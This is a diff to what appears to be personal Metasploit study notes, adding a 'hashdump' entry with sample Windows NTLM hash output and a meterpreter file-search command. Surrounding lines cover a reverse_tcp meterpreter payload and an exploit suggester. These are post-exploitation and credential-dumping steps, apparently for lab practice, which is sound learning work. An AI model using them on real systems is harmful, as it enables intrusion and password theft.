@@ -5,3 +5,9 @@ set PAYLOAD windows/meterpreter/reverse_tcp - payload for exploits
 run post/multi/recon/local_exploit_suggester - exploit to check for vunls after gaining access to the system
 getuid - get User ID information from the system that we are connected to.
 
+hashdump -- get windows user password hases through metasploit
+  Eg: Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+
+search -f -- Search for a file using meterpreter
